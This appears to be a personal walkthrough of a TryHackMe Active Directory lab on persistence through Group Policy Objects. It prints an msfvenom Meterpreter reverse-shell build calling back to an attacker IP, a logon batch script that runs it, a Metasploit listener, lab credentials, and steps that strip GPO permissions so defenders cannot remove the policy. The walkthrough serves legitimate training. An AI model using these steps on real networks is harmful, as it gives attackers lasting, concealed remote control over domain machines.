<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>GPOs</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>GPOs</h1><br/><strong><h1>Persistence Through GPOs</h1></strong><br /><br />The last persistence technique we will review is persistence through Group Policy Objects (GPOs). At this point, you should be familiar with GPOs based on all the different enumeration, attack, and exploitation techniques we have discussed. However, GPOs are also excellent for deploying persistence.<br /><br />Group Policy Management in AD provides a central mechanism to manage the local policy configuration of all domain-joined machines. This includes configuration such as membership to restricted groups, firewall and AV configuration, and which scripts should be executed upon startup. While this is an excellent tool for management, it can be targeted by attackers to deploy persistence across the entire estate. What is even worse is that the attacker can often hide the GPO in such a way that it becomes almost impossible to remove it.<br /><br /><br /><strong><h3>Domain Wide Persistence</h3></strong><br /><br />The following are some common GPO persistence techniques:<br /><br />    <strong>• </strong>Restricted Group Membership - This could allow us administrative access to all hosts in the domain<br />    <strong>• </strong>Logon Script Deployment - This will ensure that we get a shell callback every time a user authenticates to a host in the domain.<br /><br />There are many different hooks that can be deployed. You can play around with GPOs to learn about other hooks. Since we already used the first hook, Restricted Group Membership, in the Exploiting AD room. Let&#39;s now focus on the second hook. While having access to all hosts are nice, it can be even better by ensuring we get access to them when administrators are actively working on them. To do this, we will create a GPO that is linked to the Admins OU, which will allow us to get a shell on a host every time one of them authenticates to a host.<br /><br /><br /><strong><h3>Preparation</h3></strong><br /><br />Before we can create the GPO. We first need to create our shell, listener, and the actual bat file that will execute our shell. Let&#39;s start by generating a basic executable shell that we can use:<br /><br /><strong>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.50.58.189 lport=7777 -f exe &gt; cybex_shell.exe</strong><br /><br />Make sure to add your username to the binary name to avoid overwriting the shells of other users. Windows allows us to execute Batch or PowerShell scripts through the logon GPO. Batch scripts are often more stable than PowerShell scripts so lets create one that will copy our executable to the host and execute it once a user authenticates. Create the following script called <strong>cybex_script.bat</strong> on the AttackBox:<br /><br /><strong>copy \\za.tryhackme.loc\sysvol\za.tryhackme.loc\scripts\cybex_shell.exe C:\tmp\cybex_shell.exe &amp;&amp; timeout /t 20 &amp;&amp; C:\tmp\cybex_shell.exe</strong><br /><br />You will see that the script executes three commands chained together with <strong>&amp;&amp;.</strong> The script will copy the binary from the SYSVOL directory to the local machine, then wait 20 seconds, before finally executing the binary.<br /><br />We can use SCP and our <strong>Administrator</strong> <strong>credentials</strong> to copy both scripts to the SYSVOL directory:<br /><br /><img src="images/365-1.png" alt="images/365-1.png" /><br /><strong>Note:</strong> The Forward Slash Only method for SCP also works<br /><br />In Our Machine:<br /><img src="images/365-2.png" alt="images/365-2.png" /><br /><br />Finally, let&#39;s start our MSF listener:<br /><br /><strong>msfconsole -q -x &quot;use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 10.50.58.189; set LPORT 7777;exploit&quot;</strong><br /><br /><img src="images/365-3.png" alt="images/365-3.png" /><br /><br />With our prep now complete, we can finally create the GPO that will execute it. You will need to <strong>RDP</strong> into <strong>THMWRK1</strong> and use a <strong>runas</strong> window running as the <strong>Administrator</strong> for the next steps.<br /><br /><strong><h3>GPO Creation</h3></strong><br /><br />The first step uses our Domain Admin account to open the Group Policy Management snap-in:<br /><br />    1. In your <strong>runas-spawned</strong> terminal, type <strong>MMC</strong> and press <strong>enter</strong>.<br />    2. Click on <strong>File</strong>-&gt;<strong>Add/Remove Snap-in</strong>...<br />    3. Select the <strong>Group Policy Management snap-in</strong> and click <strong>Add</strong><br />    4. Click <strong>OK</strong><br /><br /><strong>runas /netonly /user:za.tryhackme.loc\Administrator cmd.exe</strong><br /><br />You should be able to see the GPO manager:<br /><br /><img src="images/365-4.png" alt="images/365-4.png" /><br /><br />While we can technically write our contents to the <strong>Default Domain Policy</strong>, which should <strong>propagate</strong> to <strong>all AD objects</strong>, <strong>we</strong> will <strong>take</strong> a more <strong>narrow</strong> approach for the task just to <strong>show</strong> <strong>the process.</strong> You can play around afterwards to apply the changes to the entire domain. <br /><br />We will write a GPO that will be applied to all Admins, so <strong>right-click</strong> on the <strong>Admins</strong> <strong>OU</strong> and select <strong>Create a GPO in this domain, and Link it here</strong>. Give your GPO a name such as username - persisting GPO: (cybex-persisting-gpo)<br /><br /><img src="images/365-5.png" alt="images/365-5.png" /><br /><br /><strong>Right-click</strong> on your <strong>policy</strong> and select <strong>Enforced</strong>. This will ensure that your policy will apply, even if there is a conflicting policy. This can help to ensure our GPO takes precedence, even if the blue team has written a policy that will remove our changes. Now you can <strong>right-click</strong> on your <strong>policy</strong> and select <strong>edit</strong>:<br /><br /><img src="images/365-6.png" alt="images/365-6.png" /><br /><br />Let&#39;s get back to our Group Policy Management Editor:<br /><br />    1. Under <strong>User Configuration</strong>, expand <strong>Policies</strong>-&gt;<strong>Windows Settings</strong>.<br />    2. Select Scripts (<strong>Logon/Logoff</strong>).<br />    3. <strong>Right-click</strong> on <strong>Logon</strong>-&gt;<strong>Properties</strong><br />    4. Select the <strong>Scripts</strong> tab.<br />    5. Click <strong>Add</strong>-&gt;<strong>Browse</strong>.<br /><br />Let&#39;s navigate to where we stored our Batch and binary files:<br /><br /><img src="images/365-7.png" alt="images/365-7.png" /><br /><br />Then Enter the \\za.tryhackme.loc\SYSVOL in the URL tab of the explorer. Then browse to our scripts.<br /><br /><img src="images/365-8.png" alt="images/365-8.png" /><br /><br />Select your Batch file as the script and click Open and OK. Click Apply and OK. This will now ensure that every time one of the administrators (tier 2, 1, and 0) logs into any machine, we will get a callback. <br /><br /><img src="images/365-9.png" alt="images/365-9.png" /><br /><br /><strong>Note:</strong> After making the changes we can run <strong>gpupdate /force</strong> to fasten the process. ( Run it in the Administrative Prompt of Runas)<br /><br />In order to simulate this, let&#39;s reset the password for one of the Tier 1 administrator accounts and authenticate to a server. Use any of the techniques you&#39;ve learned in the previous AD rooms to either reset the password of one of the Tier 1 administrators. Once done, remember to start your MSF multi-handler, and let&#39;s test it out by RDPing into THMSERVER1 or THMSERVER2!<br /><br />I have used ACLs Access to reset the password for the following admin for simulation purpose:<br />Username: <strong>t1_bruce.powell<br /></strong>Password:<strong> Password123@</strong><br /><br />Use your Tier 1 administrator credentials, RDP into one of the servers. If you give it another minute, you should get a callback on your multi-handler:<br /><br /><strong>xfreerdp /dynamic-resolution +clipboard /cert:ignore /scale:140 /v:thmserver1.za.tryhackme.loc /u:t1_bruce.powell /p:&#39;Password123@&#39;</strong><br /><br />Then we wait &amp; check our metasploit listener.<br /><br /><img src="images/365-10.png" alt="images/365-10.png" /><br /><br /><br /><strong>Note:</strong> You need to create a Logon event for the GPO to execute. If you just <strong>closed</strong> your <strong>RDP</strong> session, that only performs a <strong>disconnect</strong> which means it would not trigger the GPO. Make sure to select navigate to <strong>sign out</strong> in order to terminate the session. This will ensure that a <strong>Logon</strong> <strong>event</strong> is <strong>generated</strong> when you <strong>reauthenticate</strong>:<br /><br />Thus, we have a reverse shell connection.<br /><br /><br /><strong><h3>Hiding in Plain Sight</h3></strong><br /><br />Now that we know that our persistence is working, it is time to make sure the blue team can&#39;t simply remove our persistence. Go back to your MMC windows, click on your policy and then click on Delegation:<br /><br /><img src="images/365-11.png" alt="images/365-11.png" /><br /><br />By default, all administrators have the ability to edit GPOs. Let&#39;s remove these permissions:<br /><br />    1. Right-Click on<strong> ENTERPRISE DOMAIN CONTROLLERS</strong> and select Edit settings, delete, modify security.<br />    2. Click on all other groups (except Authenticated Users) and click <strong>Remove</strong>.<br /><br />You should be left with delegation that looks like this:<br /><br /><img src="images/365-12.png" alt="images/365-12.png" /><br /><br />Click on Advanced and <strong>remove</strong> the <strong>Created Owner</strong> from the permissions:<br /><br /><img src="images/365-13.png" alt="images/365-13.png" /><br /><br />[I performed till this step &amp; intentionally left the removal of all access from the GPO except machine account. (Discussed Below)]<br /><br />By default, all authenticated Users must have the ability to read the policy. This is required because otherwise, the policy could not be read by the user&#39;s account when they authenticate to apply User policies. If we did not have our logon script, we could also remove this permission to make sure that almost no one would be able to read our Policy.<br /><br />We could replace Authenticated Users with Domain Computers to ensure that computers can still read and apply the policy, but prevent any user from reading the policy. Let&#39;s do this to test, but remember this can result in you not getting a shell callback upon authentication since the user will not be able to read the PowerShell script, so make sure to test your shell before performing these steps. There is no going back after this:<br /><br />    1. Click <strong>Add</strong>.<br />    2. Type <strong>Domain Computers</strong>, click Check <strong>Names</strong> and then <strong>OK</strong>.<br />    3. Select<strong> Read permissions</strong> and click <strong>OK</strong>.<br />    4. Click on <strong>Authenticated Users</strong> and click <strong>Remove</strong>.<br /><br />Right after you perform these steps, you will get an error that you can no longer read your own policy:<br /><br /><img src="images/365-14.png" alt="images/365-14.png" /><br /><br />By performing these steps, we can ensure that even with the highest level of permissions, the blue team would not be able to remove our GPO unless they impersonated the machine account of a Domain Controller. This makes it extra hard to firstly discover, and even if they discover the GPO, it would be incredibly hard to remove. We don&#39;t even have the required permissions to interface with our policy anymore, so one will have to stay there until a network reset is performed. You can verify that the GPO is still applied by RDPing into one of the THMSERVERS.<br /><br /><br /><br /></div>
</body>
</html>
